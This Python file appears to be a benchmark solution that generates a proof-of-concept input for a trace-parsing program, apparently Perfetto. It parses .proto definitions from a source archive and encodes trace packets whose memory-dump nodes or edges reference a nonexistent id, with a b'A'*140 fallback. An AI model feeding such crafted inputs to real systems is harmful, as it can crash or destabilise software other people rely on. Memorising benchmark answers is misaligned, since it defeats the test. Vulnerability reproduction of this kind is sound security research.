import os
import re
import tarfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Iterable, Set


# ---------------- Protobuf encoder ----------------

def _enc_varint(x: int) -> bytes:
    if x < 0:
        x &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _enc_tag(field_num: int, wire_type: int) -> bytes:
    return _enc_varint((field_num << 3) | wire_type)


def _enc_field_varint(field_num: int, value: int) -> bytes:
    return _enc_tag(field_num, 0) + _enc_varint(value)


def _enc_field_bytes(field_num: int, payload: bytes) -> bytes:
    return _enc_tag(field_num, 2) + _enc_varint(len(payload)) + payload


# ---------------- Proto parser ----------------

_VARINT_SCALARS = {
    "int32", "int64", "uint32", "uint64", "sint32", "sint64",
    "bool", "enum",
}
_WIRE1_SCALARS = {"fixed64", "sfixed64", "double"}
_WIRE5_SCALARS = {"fixed32", "sfixed32", "float"}
_LEN_SCALARS = {"string", "bytes"}


def _strip_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//[^\n\r]*", "", s)
    return s


_TOKEN_RE = re.compile(r"""
    [A-Za-z_][A-Za-z0-9_\.]* |
    \d+ |
    [{}\[\];=<>(),]
""", re.X)


def _tokenize(s: str) -> List[str]:
    return _TOKEN_RE.findall(s)


@dataclass
class FieldDef:
    name: str
    number: int
    type_name: str
    label: str = ""  # "repeated", "optional", "required", or ""
    wire_type: int = 2  # 0/1/2/5
    is_message: bool = True


@dataclass
class MessageDef:
    full_name: str
    simple_name: str
    package: str
    fields: Dict[str, FieldDef] = field(default_factory=dict)

    def get_field_ci(self, name: str) -> Optional[FieldDef]:
        n = name.lower()
        for k, v in self.fields.items():
            if k.lower() == n:
                return v
        return None


class ProtoDB:
    def __init__(self) -> None:
        self.by_full: Dict[str, MessageDef] = {}
        self.by_simple: Dict[str, List[MessageDef]] = {}

    def add_message(self, m: MessageDef) -> None:
        self.by_full[m.full_name] = m
        self.by_simple.setdefault(m.simple_name, []).append(m)

    def resolve_message(self, type_name: str, prefer_package: Optional[str] = None) -> Optional[MessageDef]:
        t = type_name.strip()
        if not t:
            return None
        if t.startswith("."):
            t = t[1:]
            if t in self.by_full:
                return self.by_full[t]
            # fallback: match by suffix
            cand = [m for fn, m in self.by_full.items() if fn.endswith("." + t) or fn == t]
            if prefer_package:
                cand2 = [m for m in cand if m.package == prefer_package]
                if cand2:
                    cand = cand2
            if cand:
                cand.sort(key=lambda m: (0 if "perfetto" in m.full_name.lower() else 1, len(m.full_name)))
                return cand[0]
            return None

        # simple name resolution
        simple = t.split(".")[-1]
        cand = self.by_simple.get(simple, [])
        if not cand:
            # try suffix match
            cand = [m for m in self.by_full.values() if m.full_name.endswith("." + t)]
        if not cand:
            return None
        if prefer_package:
            cand2 = [m for m in cand if m.package == prefer_package]
            if cand2:
                cand = cand2
        cand.sort(key=lambda m: (0 if "perfetto" in m.full_name.lower() else 1, len(m.full_name)))
        return cand[0]


def _infer_wire_and_kind(type_name: str) -> Tuple[int, bool]:
    t = type_name.strip()
    if t.startswith("."):
        t = t[1:]
    t_simple = t.split(".")[-1]
    if t_simple in _VARINT_SCALARS:
        return 0, False
    if t_simple in _WIRE1_SCALARS:
        return 1, False
    if t_simple in _WIRE5_SCALARS:
        return 5, False
    if t_simple in _LEN_SCALARS:
        return 2, False
    if t_simple == "map":
        return 2, True
    # treat all other as message
    return 2, True


def _parse_type(tokens: List[str], idx: int) -> Tuple[str, int]:
    if idx >= len(tokens):
        return "", idx
    if tokens[idx] == "map" and idx + 1 < len(tokens) and tokens[idx + 1] == "<":
        # consume until matching '>'
        depth = 0
        j = idx
        parts = []
        while j < len(tokens):
            tok = tokens[j]
            parts.append(tok)
            if tok == "<":
                depth += 1
            elif tok == ">":
                depth -= 1
                if depth == 0:
                    j += 1
                    break
            j += 1
        return "".join(parts), j
    return tokens[idx], idx + 1


def parse_protos(file_items: Iterable[Tuple[str, bytes]]) -> ProtoDB:
    db = ProtoDB()
    for path, data in file_items:
        if not path.endswith(".proto"):
            continue
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            continue
        if "message" not in text:
            continue
        text = _strip_comments(text)
        toks = _tokenize(text)
        if not toks:
            continue

        pkg = ""
        i = 0
        stack: List[Dict] = []
        pending: Optional[Tuple[str, str]] = None  # (kind, name)
        while i < len(toks):
            tok = toks[i]
            if tok == "package" and i + 1 < len(toks):
                pkg = toks[i + 1]
                # skip to ';'
                i += 2
                while i < len(toks) and toks[i] != ";":
                    i += 1
                if i < len(toks) and toks[i] == ";":
                    i += 1
                continue

            if tok in ("import", "option", "syntax"):
                # skip to ';'
                i += 1
                while i < len(toks) and toks[i] != ";":
                    i += 1
                if i < len(toks) and toks[i] == ";":
                    i += 1
                continue

            if tok == "message" and i + 1 < len(toks):
                pending = ("message", toks[i + 1])
                i += 2
                continue
            if tok == "enum" and i + 1 < len(toks):
                pending = ("enum", toks[i + 1])
                i += 2
                continue
            if tok == "oneof" and i + 1 < len(toks):
                # only meaningful if inside a message
                in_msg = any(ctx.get("kind") == "message" for ctx in stack)
                if in_msg:
                    pending = ("oneof", toks[i + 1])
                i += 2
                continue

            if tok == "{":
                if pending:
                    kind, name = pending
                    pending = None
                    if kind == "message":
                        scopes = [ctx["name"] for ctx in stack if ctx.get("kind") == "message"]
                        full = ".".join([p for p in ([pkg] if pkg else []) + scopes + [name] if p])
                        mdef = MessageDef(full_name=full, simple_name=name, package=pkg)
                        db.add_message(mdef)
                        stack.append({"kind": "message", "name": name, "msg": mdef})
                    elif kind == "oneof":
                        stack.append({"kind": "oneof", "name": name})
                    else:  # enum
                        stack.append({"kind": "enum", "name": name})
                else:
                    stack.append({"kind": "other"})
                i += 1
                continue

            if tok == "}":
                if stack:
                    stack.pop()
                i += 1
                continue

            # Field parsing inside message (including within oneof), not inside enum.
            in_enum = any(ctx.get("kind") == "enum" for ctx in stack)
            msg_ctx = None
            for ctx in reversed(stack):
                if ctx.get("kind") == "message":
                    msg_ctx = ctx
                    break
            if msg_ctx and not in_enum:
                # skip non-field statements
                if tok in ("extensions", "reserved", "extend", "option", "message", "enum", "oneof", "group"):
                    # skip to ';' or '{'
                    i += 1
                    while i < len(toks) and toks[i] not in (";", "{", "}"):
                        i += 1
                    if i < len(toks) and toks[i] == ";":
                        i += 1
                    continue

                start_i = i
                label = ""
                if tok in ("optional", "required", "repeated"):
                    label = tok
                    i += 1
                    if i >= len(toks):
                        break
                    type_name, i2 = _parse_type(toks, i)
                else:
                    type_name, i2 = _parse_type(toks, i)

                if not type_name or i2 >= len(toks):
                    i = start_i + 1
                    continue
                name_tok = toks[i2] if i2 < len(toks) else ""
                if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", name_tok or ""):
                    i = start_i + 1
                    continue
                i3 = i2 + 1
                if i3 >= len(toks) or toks[i3] != "=":
                    i = start_i + 1
                    continue
                if i3 + 1 >= len(toks) or not toks[i3 + 1].isdigit():
                    i = start_i + 1
                    continue
                fnum = int(toks[i3 + 1])
                wire, is_msg = _infer_wire_and_kind(type_name if not type_name.startswith("map") else "map")
                fdef = FieldDef(
                    name=name_tok,
                    number=fnum,
                    type_name=type_name,
                    label=label,
                    wire_type=wire,
                    is_message=is_msg,
                )
                msg_ctx["msg"].fields[name_tok] = fdef

                # advance to ';'
                j = i3 + 2
                while j < len(toks) and toks[j] != ";":
                    # stop at '{' to avoid consuming a nested block incorrectly
                    if toks[j] in ("{", "}"):
                        break
                    j += 1
                if j < len(toks) and toks[j] == ";":
                    i = j + 1
                else:
                    i = start_i + 1
                continue

            i += 1
    return db


# ---------------- PoC synthesis ----------------

def _find_field_by_patterns(
    msg: MessageDef,
    patterns: List[str],
    *,
    require_wire: Optional[int] = None,
    require_label: Optional[str] = None,
    must_be_message: Optional[bool] = None,
) -> Optional[FieldDef]:
    pats = [p.lower() for p in patterns]
    best = None
    best_rank = (10**9, 10**9)
    for f in msg.fields.values():
        nm = f.name.lower()
        if require_wire is not None and f.wire_type != require_wire:
            continue
        if require_label is not None and (f.label != require_label):
            continue
        if must_be_message is not None and f.is_message != must_be_message:
            continue
        hit = False
        rank = 10**9
        for idx, p in enumerate(pats):
            if p and p in nm:
                hit = True
                rank = min(rank, idx)
        if not hit:
            continue
        tie = (rank, f.number)
        if tie < best_rank:
            best_rank = tie
            best = f
    return best


def _find_id_field(msg: MessageDef) -> Optional[FieldDef]:
    return _find_field_by_patterns(
        msg,
        ["id", "guid", "node_id", "dump_id", "object_id", "allocation_id", "track_id"],
        require_wire=0,
        must_be_message=False,
    )


def _find_ref_list_field_in_node(msg: MessageDef) -> Optional[FieldDef]:
    # repeated scalar varint list of ids
    # (proto3 repeated uint64 ... uses label="repeated")
    return _find_field_by_patterns(
        msg,
        ["reference", "references", "ref", "child", "children", "edge", "edges", "target", "to", "parent"],
        require_wire=0,
        require_label="repeated",
        must_be_message=False,
    )


def _find_edge_id_fields(edge_msg: MessageDef) -> Tuple[Optional[FieldDef], Optional[FieldDef]]:
    src = _find_field_by_patterns(
        edge_msg,
        ["source_id", "src_id", "from_id", "source", "src", "from", "owner_id", "parent_id"],
        require_wire=0,
        must_be_message=False,
    )
    dst = _find_field_by_patterns(
        edge_msg,
        ["target_id", "dst_id", "to_id", "target", "dst", "to", "owned_id", "child_id"],
        require_wire=0,
        must_be_message=False,
    )
    # if they are the same or missing, try generic second-best id-like fields
    if src and dst and src.number == dst.number:
        dst = None
    return src, dst


def _maybe_add_pid_like_fields(msg: MessageDef) -> bytes:
    # Keep minimal: add only one pid-ish field if present.
    f = _find_field_by_patterns(
        msg,
        ["pid", "process_id", "tgid", "upid", "process", "pid_id"],
        require_wire=0,
        must_be_message=False,
    )
    if f:
        return _enc_field_varint(f.number, 1)
    return b""


def _is_message_field(f: FieldDef) -> bool:
    if f.wire_type != 2:
        return False
    t = f.type_name.strip()
    if t.startswith("map<"):
        return False
    t_simple = t[1:].split(".")[-1] if t.startswith(".") else t.split(".")[-1]
    if t_simple in _LEN_SCALARS:
        return False
    return True


def _candidate_score(msg: MessageDef) -> int:
    name = msg.simple_name.lower()
    s = 0
    if "memory" in name:
        s += 4
    if "snapshot" in name:
        s += 4
    if "dump" in name:
        s += 4
    if "heap" in name or "graph" in name:
        s += 2
    # field name hints
    for f in msg.fields.values():
        fn = f.name.lower()
        if "allocator_dump" in fn:
            s += 3
        if "edge" in fn:
            s += 2
        if "node" in fn or "dump" in fn:
            s += 1
    return s


def _craft_invalid_reference_in_message(db: ProtoDB, msg: MessageDef) -> Optional[bytes]:
    # Find a repeated submessage field that looks like a node list.
    # And either a repeated edge list, or a repeated reference list within node.
    node_fields: List[Tuple[int, FieldDef, MessageDef, FieldDef]] = []
    for f in msg.fields.values():
        if f.label != "repeated":
            continue
        if not _is_message_field(f):
            continue
        child = db.resolve_message(f.type_name, prefer_package=msg.package)
        if not child:
            continue
        idf = _find_id_field(child)
        if not idf:
            continue
        # prioritize fields by name
        pri = 0
        fn = f.name.lower()
        if "allocator_dump" in fn:
            pri -= 50
        if "dump" in fn:
            pri -= 10
        if "node" in fn:
            pri -= 8
        if "object" in fn:
            pri -= 6
        node_fields.append((pri, f, child, idf))
    node_fields.sort(key=lambda x: (x[0], x[1].number))
    if not node_fields:
        return None

    # Find edge field candidates
    edge_fields: List[Tuple[int, FieldDef, MessageDef, Optional[FieldDef], Optional[FieldDef]]] = []
    for f in msg.fields.values():
        if f.label != "repeated":
            continue
        if not _is_message_field(f):
            continue
        child = db.resolve_message(f.type_name, prefer_package=msg.package)
        if not child:
            continue
        src, dst = _find_edge_id_fields(child)
        # also accept single-id edge references (less ideal)
        if not (src or dst):
            continue
        pri = 0
        fn = f.name.lower()
        if "allocator_dump_edge" in fn:
            pri -= 50
        if "edge" in fn:
            pri -= 15
        edge_fields.append((pri, f, child, src, dst))
    edge_fields.sort(key=lambda x: (x[0], x[1].number))

    # Try node-internal references first (often smallest) if available
    for _, node_f, node_msg, node_idf in node_fields[:5]:
        ref_f = _find_ref_list_field_in_node(node_msg)
        if ref_f:
            node_bytes = _enc_field_varint(node_idf.number, 1) + _enc_field_varint(ref_f.number, 2)
            msg_bytes = _maybe_add_pid_like_fields(msg) + _enc_field_bytes(node_f.number, node_bytes)
            return msg_bytes

    # Try separate edges
    for _, node_f, node_msg, node_idf in node_fields[:5]:
        node_bytes = _enc_field_varint(node_idf.number, 1)
        node_part = _enc_field_bytes(node_f.number, node_bytes)
        for _, edge_f, edge_msg, src_f, dst_f in edge_fields[:8]:
            edge_parts = bytearray()
            if src_f:
                edge_parts += _enc_field_varint(src_f.number, 1)
            if dst_f:
                edge_parts += _enc_field_varint(dst_f.number, 2)
            else:
                # if only one of (src/dst) found, set that one to missing id
                if src_f and not dst_f:
                    edge_parts = bytearray(_enc_field_varint(src_f.number, 2))
            if not edge_parts:
                continue
            edge_part = _enc_field_bytes(edge_f.number, bytes(edge_parts))
            msg_bytes = _maybe_add_pid_like_fields(msg) + node_part + edge_part
            return msg_bytes

    return None


def _build_adjacency(db: ProtoDB) -> Dict[str, List[Tuple[FieldDef, MessageDef]]]:
    adj: Dict[str, List[Tuple[FieldDef, MessageDef]]] = {}
    for m in db.by_full.values():
        edges = []
        for f in m.fields.values():
            if not _is_message_field(f):
                continue
            child = db.resolve_message(f.type_name, prefer_package=m.package)
            if not child:
                continue
            edges.append((f, child))
        if edges:
            adj[m.full_name] = edges
    return adj


def _bfs_path(
    adj: Dict[str, List[Tuple[FieldDef, MessageDef]]],
    start: MessageDef,
    target: MessageDef
) -> Optional[List[Tuple[MessageDef, FieldDef, MessageDef]]]:
    if start.full_name == target.full_name:
        return []
    q: List[str] = [start.full_name]
    prev: Dict[str, Tuple[str, FieldDef, str]] = {}
    seen: Set[str] = {start.full_name}
    while q:
        cur = q.pop(0)
        for f, child in adj.get(cur, []):
            nxt = child.full_name
            if nxt in seen:
                continue
            seen.add(nxt)
            prev[nxt] = (cur, f, nxt)
            if nxt == target.full_name:
                q.clear()
                break
            q.append(nxt)
    if target.full_name not in prev:
        return None

    # reconstruct
    path_rev: List[Tuple[str, FieldDef, str]] = []
    cur = target.full_name
    while cur != start.full_name:
        pcur, f, nxt = prev[cur]
        path_rev.append((pcur, f, nxt))
        cur = pcur
    path_rev.reverse()

    # map to MessageDefs
    result: List[Tuple[MessageDef, FieldDef, MessageDef]] = []
    for pcur, f, nxt in path_rev:
        pm = db.by_full.get(pcur)
        cm = db.by_full.get(nxt)
        if not pm or not cm:
            return None
        result.append((pm, f, cm))
    return result


def _wrap_along_path(
    db: ProtoDB,
    path: List[Tuple[MessageDef, FieldDef, MessageDef]],
    payload: bytes
) -> bytes:
    # path is (parent, field, child), starting from TracePacket down to target.
    # Wrap from bottom up excluding TracePacket itself; then set on TracePacket.
    if not path:
        return payload
    cur_bytes = payload
    # Build each child wrapper moving upward: for each step, construct parent message that only contains field pointing to child
    # We do this from the deepest parent (just above payload) up to TracePacket.
    for parent, fielddef, child in reversed(path):
        parent_bytes = _maybe_add_pid_like_fields(parent) + _enc_field_bytes(fielddef.number, cur_bytes)
        cur_bytes = parent_bytes
    # After processing all reversed steps, cur_bytes is actually a TracePacket message (since first parent in path is TracePacket)
    return cur_bytes


def _find_trace_and_packet(db: ProtoDB) -> Tuple[Optional[MessageDef], Optional[MessageDef], int]:
    tp = db.resolve_message("TracePacket")
    tr = db.resolve_message("Trace")
    packet_field_num = 1
    if tr and tp:
        # find repeated field in Trace with type TracePacket
        best = None
        for f in tr.fields.values():
            if f.wire_type != 2:
                continue
            if not _is_message_field(f):
                continue
            child = db.resolve_message(f.type_name, prefer_package=tr.package)
            if child and child.simple_name == "TracePacket":
                if best is None or f.number < best.number:
                    best = f
        if best:
            packet_field_num = best.number
    return tr, tp, packet_field_num


def _iter_tar_or_dir_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if fn.endswith(".proto"):
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            yield (os.path.relpath(p, src_path), f.read())
                    except Exception:
                        continue
        return

    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name
            if not name.endswith(".proto"):
                continue
            if m.size <= 0 or m.size > 5_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                yield (name, data)
            except Exception:
                continue


class Solution:
    def solve(self, src_path: str) -> bytes:
        file_items = list(_iter_tar_or_dir_files(src_path))
        db = parse_protos(file_items)

        trace_msg, trace_packet_msg, trace_packet_field_num = _find_trace_and_packet(db)
        if not trace_packet_msg:
            # Best-effort fallback: minimal data
            return b"A" * 140

        adj = _build_adjacency(db)

        # Find reachable candidate messages that can be crafted
        candidates: List[Tuple[int, int, MessageDef, List[Tuple[MessageDef, FieldDef, MessageDef]], bytes]] = []
        for m in db.by_full.values():
            crafted = _craft_invalid_reference_in_message(db, m)
            if crafted is None:
                continue
            path = _bfs_path(adj, trace_packet_msg, m)
            if path is None:
                continue
            sc = _candidate_score(m)
            # prioritize higher score, shorter path, shorter crafted
            candidates.append((sc, len(path), m, path, crafted))

        if not candidates:
            # Try direct ProcessMemoryDump if available
            pmd = db.resolve_message("ProcessMemoryDump")
            if pmd:
                crafted = _craft_invalid_reference_in_message(db, pmd) or b""
                path = _bfs_path(adj, trace_packet_msg, pmd) or []
                tp_bytes = _wrap_along_path(db, path, crafted if crafted else b"")
                trace_stream = _enc_field_bytes(trace_packet_field_num, tp_bytes)
                return trace_stream if trace_stream else (b"A" * 140)
            return b"A" * 140

        candidates.sort(key=lambda x: (-x[0], x[1], len(x[4]), len(x[2].full_name)))

        # Build up to 3 packets for robustness
        out = bytearray()
        used = 0
        for sc, _, m, path, crafted in candidates:
            tp_bytes = _wrap_along_path(db, path, crafted)
            # also add a timestamp if TracePacket has one (helps some pipelines, small overhead)
            ts_f = trace_packet_msg.get_field_ci("timestamp")
            if ts_f and ts_f.wire_type == 0 and not any(tp_bytes.startswith(_enc_tag(ts_f.number, 0)) for _ in [0]):
                tp_bytes = _enc_field_varint(ts_f.number, 1) + tp_bytes
            out += _enc_field_bytes(trace_packet_field_num, tp_bytes)
            used += 1
            if used >= 3:
                break

        if out:
            return bytes(out)

        return b"A" * 140